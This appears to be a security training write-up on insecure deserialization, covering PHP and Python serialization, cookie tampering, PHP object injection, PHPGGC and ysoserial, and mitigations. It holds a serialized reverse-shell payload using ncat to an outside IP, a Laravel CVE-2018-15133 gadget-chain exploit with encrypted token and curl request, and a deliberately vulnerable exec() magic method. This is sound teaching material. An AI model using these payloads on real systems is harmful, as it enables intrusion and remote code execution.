# Insecure Deserialization

## 0. Concepts

### Serialization

Serialization is the process of converting an object’s state into a format that can be stored or transmitted and later reconstructed. The output may be human-readable, binary, or a mixture of both. This is commonly used when data must be transferred between components of a system or across a network.

In PHP, serialization is performed using the `serialize()` function.

**Example:**

```php
<?php
$noteArray = array("title" => "My THM Note", "content" => "Welcome to THM!");
$serialisedNote = serialize($noteArray);  // Convert array to storable format
file_put_contents('note.txt', $serialisedNote);  // Save to file
?>
```

Serialized output in `note.txt`:

```txt
a:2:{s:5:"title";s:12:"My THM Note";s:7:"content";s:12:"Welcome to THM!";}
```

The serialized string contains structural and content information that allows the data to be reconstructed later.

### Deserialization

Deserialization is the reverse process of serialization. It converts serialized data back into its original object or data structure. This is used when retrieving stored or transmitted data so it can be used by the application.

**Example:**

```php
<?php
$serialisedNote = file_get_contents('note.txt');  // Read serialized data
$noteArray = unserialize($serialisedNote);        // Convert back to array

echo "Title: " . $noteArray['title'] . "<br>";
echo "Content: " . $noteArray['content'];
?>
```

This code reads the serialized data from a file and reconstructs the original array.

### Security Considerations

Insecure deserialization can introduce serious vulnerabilities. If an application unserializes untrusted data, attackers may manipulate the serialized object to trigger unintended behavior such as remote code execution or data exposure.

### Notable Incidents Involving Deserialization Vulnerabilities

* [Log4j Vulnerability — CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
* [Oracle WebLogic Server — CVE-2015-4852](https://www.oracle.com/security-alerts/alert-cve-2015-4852.html)
* [Jenkins Java Deserialization — CVE-2016-0792](https://www.tenable.com/plugins/nessus/89034)

---

## 1. Serialization Formats

### PHP Serialization

In PHP, serialization is performed using the `serialize()` function. It converts an object or array into a structured string that preserves both the data and its type information. This representation can then be stored or transmitted and later reconstructed using `unserialize()`.

Consider a simple notes application:

```php
class Notes {
    public $content;

    public function __construct($content) {
        $this->content = $content;
    }
}
```

When a note is created and serialized:

```php
$note = new Notes("Welcome to THM");
$serialized_note = serialize($note);
```

The output may look like:

```txt
O:5:"Notes":1:{s:7:"content";s:14:"Welcome to THM";}
```

**Structure breakdown:**

* **`O:5:"Notes":1:`**
  `O` indicates an **object**.
  `5` is the length of the class name (`Notes`).
  `1` indicates the object contains **one property**.

* **`s:7:"content";`**
  `s` represents a **string**.
  `7` is the length of the property name `content`.

* **`s:14:"Welcome to THM";`**
  `s` again indicates a string value.
  `14` is the length of the stored value.

PHP uses similar markers for other data types:

* `a` → array
* `O` → object
* `s` → string
* `i` → integer
* `b` → boolean
* `d` → float

For comparison, serializing an array such as:

```php
$noteArray = array(
  "title" => "My THM Note",
  "content" => "Welcome to THM!"
);
```

produces:

```txt
a:2:{s:5:"title";s:12:"My THM Note";s:7:"content";s:12:"Welcome to THM!";}
```

**Array structure breakdown:**

* **`a:2:`**
  `a` indicates an **array** containing **two elements**.

* **`s:5:"title";`**
  String key `title` (length 5).

* **`s:12:"My THM Note";`**
  String value associated with `title`.

* **`s:7:"content";`**
  String key `content`.

* **`s:12:"Welcome to THM!";`**
  String value associated with `content`.

Unlike the object example, this structure stores **key–value pairs** rather than class properties.

**Magic Methods:**

PHP provides special methods that influence serialization behaviour:

* `__sleep()` – executed before serialization; returns properties that should be serialized.
* `__wakeup()` – executed after deserialization; commonly used to restore resources.
* `__serialize()` – introduced in PHP 7.4 for custom serialization logic.
* `__unserialize()` – restores the object from custom serialized data.

These methods are important because they can execute automatically during deserialization, which is a common source of security issues.

### Python Serialization

Python commonly uses the **`pickle`** module for serialization. It converts Python objects into a binary byte stream and reconstructs them later.

Example from a notes application:

```python
import pickle
import base64

serialized_data = request.form['serialized_data']
notes_obj = pickle.loads(base64.b64decode(serialized_data))
message = "Notes successfully unpickled."

elif request.method == 'POST':
    if 'pickle' in request.form:
        content = request.form['note_content']
        notes_obj.add_note(content)
        pickled_content = pickle.dumps(notes_obj)
        serialized_data = base64.b64encode(pickled_content).decode('utf-8')
        binary_data = ' '.join(f'{x:02x}' for x in pickled_content)
        message = "Notes pickled successfully."
```

**Pickling process:**

* **Serialization (`pickle.dumps`)**
  The `Notes` object is converted into a **binary byte stream** representing its state.

* **Base64 encoding**
  Since binary data is not always safe for transmission (e.g., over HTTP), it is encoded into a **base64 string**, which contains only readable characters.

* **Deserialization (`pickle.loads`)**
  The base64 string is decoded back to binary and then reconstructed into the original Python object.

Unlike PHP’s readable serialization format, **pickle data is binary and not human-readable**. This makes it compact but harder to inspect manually.

Serialization exists in many programming ecosystems. Java uses the `Serializable` interface for object serialization, .NET applications commonly use `System.Text.Json` for safer data interchange, and Ruby provides the `Marshal` module for object serialization. While implementations differ, the core concept remains the same: converting objects into a storable or transferable representation that can later be reconstructed.

---

## 2. Identification

### Access to the Source Code

When source code is available, identifying serialization vulnerabilities becomes more straightforward. During code review, look for serialization and deserialization functions such as `serialize()`, `unserialize()`, `pickle.loads()`, or similar mechanisms in other languages. These locations should be examined carefully, especially where **user-controlled input** may be passed directly into deserialization functions.

Particular attention should be given to:

* Data received from **cookies, POST requests, query parameters, or files**.
* Objects reconstructed through functions like `unserialize()` or `pickle.loads()` without validation.
* Classes containing **magic methods** (e.g., `__wakeup()` or `__destruct()` in PHP) that may execute automatically during deserialization.

If untrusted data reaches these functions, attackers may craft malicious serialized payloads to manipulate application behaviour or execute unintended code.

### No Access to the Source Code

When the source code is unavailable, the assessment becomes **black-box testing**, where the goal is to infer how the application processes data through external behaviour.

One common reconnaissance technique is requesting files with a tilde appended (e.g., `file.php~`). Some editors and version control tools create backup files using this naming pattern, which may accidentally expose source code.

**Analysing Server Responses:**

* **Error messages:** Server errors sometimes reveal internal processing. Messages containing references such as `unserialize()` or **object deserialization error** can indicate that serialized data is being processed.
* **Application behaviour changes:** Modifying cookies, parameters, or POST data and observing unexpected behaviour may suggest that the application is deserializing client-supplied data.

**Examining Cookies:**

Serialized data is often stored in cookies or hidden form fields.

* **Base64-encoded cookie values:** Many applications encode serialized data using base64 to make it safe for transmission. Decoding these values may reveal serialized arrays or objects.
* **ASP.NET ViewState:** .NET applications may store serialized data in the `__VIEWSTATE` parameter. This value is typically base64 encoded and may contain serialized state information sent between the client and server.

By decoding and modifying these values, testers can determine whether the application improperly trusts serialized data supplied by the client.

---

## 3. Exploitation - Updating Properties of an Object

In this example, we examine a simple PHP note-sharing application. The application allows users to create, save, and share notes. Some features, such as sharing notes, are restricted to subscribed users.

![img](/img/InsecureDeserialisation/1.png)

### Defining the Notes Class

The application defines a `Notes` class that stores user information. It contains three private properties: `user`, `role`, and `isSubscribed`.

```php
class Notes {

    private $user;
    private $role;
    private $isSubscribed;

    public function __construct($user, $role, $isSubscribed) {
        $this->user = $user;
        $this->role = $role;
        $this->isSubscribed = $isSubscribed;
    }

    public function setIsSubscribed($isSubscribed) {
        $this->isSubscribed = $isSubscribed;
    }

    public function getIsSubscribed() {
        return $this->isSubscribed;
    }
}
```

### Storing User Data in Cookies

When a user first visits the application, a cookie is created containing a serialized object with their user information: username, role, and subscription status (`isSubscribed`). Only users with `isSubscribed = true` can share notes.

![img](/img/InsecureDeserialisation/2.png)

### Exploiting the Vulnerability

An attacker can intercept the cookie, decode it, and modify the serialized object.

After base64 decoding the cookie value, the serialized object may look like:

```txt
O:5:"Notes":3:{s:4:"user";s:5:"guest";s:4:"role";s:5:"guest";s:12:"isSubscribed";b:0;}
```

**Structure breakdown:**

* **`O:5:"Notes":3`**
  `O` indicates an **object**, `5` is the length of the class name `Notes`, and `3` indicates the object contains **three properties**.

* **`s:4:"user";s:5:"guest";`**
  `s` indicates a **string**.
  `user` is the property name (length 4) with value `"guest"` (length 5).

* **`s:4:"role";s:5:"guest";`**
  The `role` property is also stored as the string `"guest"`.

* **`s:12:"isSubscribed";b:0;`**
  `isSubscribed` is a **boolean** property (`b`).
  `0` represents **false**, meaning the user is not subscribed.

When a user attempts to share a note without a subscription, the application blocks the action.

![img](/img/InsecureDeserialisation/3.png)

On the backend, the server reads the cookie, deserializes the object, and checks the value of `isSubscribed`. If the value is `false`, note sharing is denied.

An attacker can modify the serialized data and change the boolean value:

```txt
b:0 → b:1
```

This changes the property to:

```txt
s:12:"isSubscribed";b:1;
```

Now the serialized object indicates that the user **is subscribed**.

![img](/img/InsecureDeserialisation/4.png)

The attacker then re-encodes the modified serialized data using base64 and replaces the original cookie value. When the server deserializes this manipulated object, it interprets the user as a subscribed member and allows note sharing.

Tools such as **Burp Suite Inspector** can simplify decoding, modifying, and re-encoding cookie values during testing.

---

## 4. Exploitation - Object Injection

Object injection is a vulnerability that occurs when an application **deserializes untrusted data into objects**. If the application accepts attacker-controlled serialized input, an attacker can construct malicious objects that trigger unintended behavior during deserialization.

This risk exists because serialization stores not only data but also **class names and object properties**. When the application calls `unserialize()`, PHP recreates the object and may automatically execute certain **magic methods** such as `__wakeup()`, `__destruct()`, or `__toString()`.

If these methods perform sensitive actions (e.g., executing commands, accessing files, or making network requests), an attacker may be able to exploit them.

For a PHP object injection attack to succeed, several conditions typically exist:

* The application **deserializes user-controlled data** (e.g., from cookies, POST parameters, or URL parameters).
* The application includes classes containing **dangerous magic methods**.
* The required classes are **loaded before `unserialize()` executes** (either through direct inclusion or autoloading).

### Vulnerable Deserialization Example

Consider a simplified PHP application that serializes and deserializes user data.

```php
<?php
class UserData {
    private $data;

    public function __construct($data) {
        $this->data = $data;
    }
}

require 'test.php';

if(isset($_GET['encode'])) {

    $userData = new UserData($_GET['encode']);
    $serializedData = serialize($userData);
    $base64EncodedData = base64_encode($serializedData);

    echo "Normal Data: " . $_GET['encode'] . "<br>";
    echo "Serialized Data: " . $serializedData . "<br>";
    echo "Base64 Encoded Data: " . $base64EncodedData;

} elseif(isset($_GET['decode'])) {

    $base64EncodedData = $_GET['decode'];
    $serializedData = base64_decode($base64EncodedData);

    $test = unserialize($serializedData);

    echo "Base64 Encoded Serialized Data: " . $base64EncodedData . "<br>";
    echo "Serialized Data: " . $serializedData;
}
```

If the user supplies input through `?encode=value`, the application serializes it and displays the serialized representation. In this case `?encode=hellothm`

![img](/img/InsecureDeserialisation/5.png)

However, the application also supports a `decode` parameter that **directly unserializes user-provided data**, which creates the vulnerability.

### Dangerous Class Behavior

The included file `test.php` contains another class with a magic method:

```php
<?php
class MaliciousUserData {
    public $command;
    public function __wakeup() {
        exec($this->command);
    }
}
?>
```

The `__wakeup()` method is automatically executed whenever an object of this class is deserialized. If the `command` property contains a system command, that command will be executed during deserialization.

### Why This Is Dangerous

During insecure deserialization, attackers cannot modify the **definition of the class or its methods**. However, they **can control the object's properties**.

Because the `__wakeup()` method executes `$this->command`, an attacker can supply serialized data that sets the `command` property to any system command.

When the application deserializes this object, the `__wakeup()` method runs and executes the attacker-controlled command.

### Crafting a Malicious Serialized Object

An attacker can generate a serialized object locally using PHP.

```php
<?php
class MaliciousUserData {
    public $command = 'ATTACKER_COMMAND';
}

$maliciousUserData = new MaliciousUserData();

$serializedData = serialize($maliciousUserData);
$base64EncodedData = base64_encode($serializedData);

echo $base64EncodedData;
?>
```

This script generates a **base64-encoded serialized object** that contains the attacker-controlled property.

```php
// Serialized data before base64 encoding
O:17:"MaliciousUserData":1:{s:7:"command";s:37:"ncat -nv 10.49.98.191 4444 -e /bin/sh";}

// Serialized data after base64 encoding
TzoxNzoiTWFsaWNpb3VzVXNlckRhdGEiOjE6e3M6NzoiY29tbWFuZCI7czozNzoibmNhdCAtbnYgMTAuNDkuOTguMTkxIDQ0NDQgLWUgL2Jpbi9zaCI7fQ==
```

The resulting payload can then be supplied to the vulnerable application:

```txt
http://MACHINE_IP/case2/?decode=PAYLOAD
```

Once the server processes this request:

1. The base64 string is decoded.
2. The serialized object is passed to `unserialize()`.
3. PHP recreates the `MaliciousUserData` object.
4. The `__wakeup()` method is automatically triggered.
5. The command stored in `$command` is executed on the server.

### Key Takeaway

PHP object injection vulnerabilities occur when **untrusted serialized data is deserialized in an environment where exploitable classes exist**. Attackers abuse this by crafting serialized objects whose properties trigger dangerous behavior during magic method execution.

In real-world applications, exploitation often relies on **gadget chains**—sequences of existing classes and methods within a framework that can be combined to achieve unintended behavior such as file writes, data exfiltration, or remote code execution.

---

## 5. Automation Scripts

Automation is essential during penetration testing to efficiently identify and exploit vulnerabilities in web applications. For insecure deserialization in PHP, one of the most widely used tools is **PHP Gadget Chain (PHPGGC)**. It automates the creation of serialized payloads that exploit object injection vulnerabilities. PHPGGC plays a role similar to **Ysoserial** in the Java ecosystem.

### PHP Gadget Chain (PHPGGC)

PHPGGC is a tool designed to generate **gadget chains** for PHP object injection attacks. It targets vulnerabilities that arise when applications unserialize untrusted data.

**Functionality:**

* **Gadget Chains:** PHPGGC includes a library of gadget chains for many PHP frameworks and libraries. These chains consist of sequences of objects and methods that trigger unintended behavior when deserialized.
* **Payload Generation:** It generates serialized payloads capable of exploiting insecure deserialization vulnerabilities.
* **Payload Customisation:** Payloads can be customized by passing arguments to functions or methods within the gadget chain, allowing testers to tailor the attack to specific objectives.

[PHPGGC](https://github.com/ambionics/phpggc) can be downloaded from its GitHub repository

To list all available gadget chains:

```bash
root@machine:/opt/phpggc$ php phpggc -l

Gadget Chains
-------------

NAME                                      VERSION                                                 TYPE                      VECTOR          I    
Bitrix/RCE1                               17.x.x <= 22.0.300                                      RCE: Command              __destruct           
CakePHP/RCE1                              ? <= 3.9.6                                              RCE: Command              __destruct           
CakePHP/RCE2                              ? <= 4.2.3                                              RCE: Command              __destruct           
CodeIgniter4/FD1                          <= 4.3.6                                                File delete               __destruct           
CodeIgniter4/FD2                          <= 4.3.7                                                File delete               __destruct           
CodeIgniter4/FR1                          4.0.0 <= 4.3.6                                          File read                 __toString      *    
CodeIgniter4/RCE1                         4.0.2                                                   RCE: Command              __destruct           
CodeIgniter4/RCE2                         4.0.0-rc.4 <= 4.3.6                                     RCE: Command              __destruct           
CodeIgniter4/RCE3                         4.0.4 <= 4.4.3                                          RCE: Command              __destruct           
CodeIgniter4/RCE4                         4.0.0-beta.1 <= 4.0.0-rc.4                              RCE: Command              __destruct
```

Each entry describes:

* **Name** – gadget chain identifier
* **Version** – affected framework versions
* **Type** – attack objective (RCE, file read, file deletion, etc.)
* **Vector** – the PHP magic method used to trigger execution

For example, `CakePHP/RCE1` targets CakePHP versions up to **3.9.6** and achieves remote command execution through the `__destruct` magic method.

Gadget chains can also be filtered for specific frameworks:

```bash
root@machine:/opt/phpggc$ php phpggc -l Laravel

Gadget Chains
-------------

NAME                  VERSION           TYPE             VECTOR    
Laravel/RCE1          5.4.27            rce              __destruct
Laravel/RCE2          5.5.39            rce              __destruct
Laravel/RCE3          5.5.39            rce              __destruct
Laravel/RCE4          5.5.39            rce              __destruct
```

### Exploiting a Web Application

Consider a Laravel application vulnerable to **CVE-2018-15133**, a deserialization flaw triggered when Laravel processes untrusted data from the `X-XSRF-TOKEN` header. If exploited, it can lead to remote command execution.

Exploitation generally involves three steps:

1. **Obtain the Laravel `APP_KEY`**, which is used to encrypt and decrypt cookies or tokens.
2. **Generate a serialized payload** capable of executing a command.
3. **Encrypt the payload with the `APP_KEY`** and send it to the application.

In many real-world engagements, Step 2 is the most technically complex, which is where PHPGGC becomes useful.

Assume the `APP_KEY` has been obtained: `HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY=`

A payload can be generated using a gadget chain. For example:

```bash
root@machine:~$ php phpggc -b Laravel/RCE3 system ls

Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6MjoibHMiO3M6MTc6IgAqAGRlZmF1bHRDaGFubmVsIjtzOjE6IngiO3M6MTc6IgAqAGN1c3RvbUNyZWF0b3JzIjthOjE6e3M6MToieCI7czo2OiJzeXN0ZW0iO319fQ==
```

The non-encoded serialized object looks like:

```bash
root@machine:/opt/phpggc$ php phpggc Laravel/RCE3 system ls

O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"*events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"*app";s:2:"ls";s:17:"*defaultChannel";s:1:"x";s:17:"*customCreators";a:1:{s:1:"x";s:6:"system";}}}
```

**Breakdown of the Payload:**

* **`Illuminate\Broadcasting\PendingBroadcast`** – Used as a container object during deserialization.
* **`Illuminate\Notifications\ChannelManager`** – A framework class whose properties are manipulated to execute arbitrary code.
* **`*app` property** – Stores the command (`ls`).
* **`*defaultChannel` and `*customCreators`** – Adjusted to trigger a code execution path during object destruction.

![img](/img/InsecureDeserialisation/6.png)

Laravel historically stored encrypted serialized values inside cookies and tokens. Even though encryption protects the data from direct tampering, exploitation becomes possible once the encryption key (`APP_KEY`) is known.

**Creating an Encrypted Payload:**

Once the payload is generated, it must be encrypted with the Laravel `APP_KEY` before sending it to the application.

[CVE-2018-15133.php]((/Scripting/PHP/CVE-2018-15133.php)) script can be used to generate the encrypted token:

```bash
php CVE-2018-15133.php APP_KEY PAYLOAD
```

Example:

```bash
root@machine:~$ php CVE-2018-15133.php HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6MjoibHMiO3M6MTc6IgAqAGRlZmF1bHRDaGFubmVsIjtzOjE6IngiO3M6MTc6IgAqAGN1c3RvbUNyZWF0b3JzIjthOjE6e3M6MToieCI7czo2OiJzeXN0ZW0iO319fQ==
This Script belongs to Insecure Deserialization
HTTP header for POST request:
X-XSRF-TOKEN: eyJpdiI6IjdwVkVWWTBvMnhrd2laTXJpQnVDZEE9PSIsInZhbHVlIjoiQ1wvVENGXC9DMWlmRVdUVlFyeDF2QU0wdXV4U29FMTJXZWJ4QXVzMFRGYktjY3g2NWZoMXgzdHp0RGRIVjFIcVViRWNyQjVPYmltank1OGQyNTlYdWtlWEZTVkFUeFJhcXFhaWpUZnZ3OUpzZXhuSm5kcGxRakx4cW1Oa0IyYWRxS2lkaDg4UFBPTDZhbUFEcEJvdVhCdnBRaHJXYmQ4Y0g2MFNsTW9Ed3dQK1Raa3g3R08xN1FuWTg3VkhuSTk2WmxsWGpOTGE4RitjZlZRMURsdGVtSGVpSW9yMkhRK0hhZk1jbUZad2lOcmErNHVOOXduN0tZd256OVJDTUViUkliXC9zbTJabXhFZTFQYVBHU1BGSnhZbmo1NGZpZXphNWxYbkZwbUJKOWRManhnUW9ReUJIMjhDaUF2bDl1aHcyaDciLCJtYWMiOiIyMDcyYzgyYzUwMzM4Y2MyNjNhMTM4YTY2M2IxM2YzNWNlMjAzYjNmOGNkNzVmNmFiNmEyNzM1YzU1Mjc5ZDk3In0=
```

The script produces a valid encrypted CSRF token(`X-XSRF-TOKEN`) that can be supplied to the server.

```bash
curl -sS TARGET -X POST -H 'X-XSRF-TOKEN:ENCRYPTED_TOKEN'
```

Example request:

```bash
root@machine:~$ curl -s 10.49.186.200:8089 -X POST -H 'X-XSRF-TOKEN:eyJpdiI6IjdwVkVWWTBvMnhrd2laTXJpQnVDZEE9PSIsInZhbHVlIjoiQ1wvVENGXC9DMWlmRVdUVlFyeDF2QU0wdXV4U29FMTJXZWJ4QXVzMFRGYktjY3g2NWZoMXgzdHp0RGRIVjFIcVViRWNyQjVPYmltank1OGQyNTlYdWtlWEZTVkFUeFJhcXFhaWpUZnZ3OUpzZXhuSm5kcGxRakx4cW1Oa0IyYWRxS2lkaDg4UFBPTDZhbUFEcEJvdVhCdnBRaHJXYmQ4Y0g2MFNsTW9Ed3dQK1Raa3g3R08xN1FuWTg3VkhuSTk2WmxsWGpOTGE4RitjZlZRMURsdGVtSGVpSW9yMkhRK0hhZk1jbUZad2lOcmErNHVOOXduN0tZd256OVJDTUViUkliXC9zbTJabXhFZTFQYVBHU1BGSnhZbmo1NGZpZXphNWxYbkZwbUJKOWRManhnUW9ReUJIMjhDaUF2bDl1aHcyaDciLCJtYWMiOiIyMDcyYzgyYzUwMzM4Y2MyNjNhMTM4YTY2M2IxM2YzNWNlMjAzYjNmOGNkNzVmNmFiNmEyNzM1YzU1Mjc5ZDk3In0='  | head -n 10
css
cve.php
favicon.ico
index.php
js
robots.txt
web.config
<!DOCTYPE html><!--

```

If the vulnerability is successfully exploited, the payload executes on the server and its output appears in the response.

### Framework-Specific Exploitation

Although many PHP frameworks rely on serialization internally, their **class structures and security mechanisms differ**. A gadget chain designed for Laravel typically cannot be used against frameworks like WordPress, Yii, or CakePHP without modification because the exploit relies on specific framework classes and execution paths.

Understanding the target framework and its available gadget chains is therefore critical when exploiting insecure deserialization.

### Ysoserial for Java

For Java applications, the equivalent tool is **Ysoserial**. It generates serialized payloads designed to exploit Java deserialization vulnerabilities.

Example usage:

```bash
java -jar ysoserial.jar [payload type] '[command]'
```

```bash
java -jar ysoserial.jar CommonsCollections1 'calc.exe'
```

This command produces a serialized object that executes `calc.exe` when deserialized by a vulnerable Java application.

Ysoserial is available on GitHub:
[https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)

---

## 6. Mitigation Measures

Insecure deserialisation is dangerous because it allows an attacker to supply data that the application trusts as an internal object. When the application reconstructs that object, its properties and methods may execute automatically. If those methods contain unsafe logic, the attacker can manipulate the application into performing unintended actions such as executing system commands, reading files, or modifying application behaviour.

Mitigation therefore focuses on two perspectives: the **security tester identifying weaknesses** and the **developer preventing them in the first place**.

### 6.1 **Pentester Perspective**

From a penetration tester's viewpoint, the objective is to locate and verify insecure deserialisation entry points.

**Codebase analysis:**

Carefully review the application's source code to identify where serialisation and deserialisation occur. Functions such as `serialize()`, `unserialize()`, `pickle.loads()`, `readObject()`, or framework-specific equivalents are important indicators. Any location where **user-controlled input reaches these functions** becomes a potential attack surface.

**Vulnerability identification:**

Static analysis tools help detect insecure coding patterns automatically. During testing, pay attention to:

* Unsafe deserialisation functions
* Weak input validation around serialised objects
* Outdated libraries or frameworks known to contain deserialisation gadget chains

Many real-world deserialisation attacks rely on known vulnerable dependencies rather than purely custom code.

**Fuzzing and dynamic analysis:**

Fuzzing involves sending malformed or unexpected input to the application. When applied to serialised data structures, fuzzing can reveal how the system behaves when corrupted or manipulated objects are processed. Dynamic analysis tools can observe application behaviour at runtime and help detect unusual execution paths triggered during deserialisation.

**Error handling assessment:**

Applications sometimes leak useful information through error messages. Messages mentioning functions such as `unserialize()` or errors like **Object deserialisation failed** may reveal internal logic and confirm the presence of serialisation mechanisms. Stack traces or debug output can also expose class names used in gadget chains.

### 6.2 **Secure Coder Perspective**

From the developer’s side, the focus is eliminating the conditions that make deserialisation attacks possible.

**Avoid insecure serialisation formats:**

Certain formats are historically unsafe, particularly **Java native serialisation**, because they allow arbitrary object reconstruction with minimal validation. Safer alternatives such as **JSON** or **XML with strict schema validation** are generally preferred since they treat data as structured values rather than executable objects.

**Avoid dangerous execution functions:**

Functions such as `eval()` and `exec()` should never process data derived from deserialised objects. These functions directly execute code and therefore transform data manipulation into full code execution vulnerabilities.

**Strict input validation:**

Applications should only accept data structures that match expected formats. Whitelisting allowed object types, validating data structure schemas, and rejecting unknown classes significantly reduces attack opportunities.

**Secure coding practices:**

Secure development principles reduce the overall attack surface:

* **Least privilege:** components operate with minimal permissions
* **Defence in depth:** multiple security layers prevent single-point failure
* **Fail-safe defaults:** unexpected behaviour results in denial rather than execution

**Adherence to security guidelines:**

Developers should follow established secure coding standards specific to their language or framework. Many modern frameworks already include hardened serialisation mechanisms when used correctly, but ignoring recommended practices can reintroduce vulnerabilities.

---
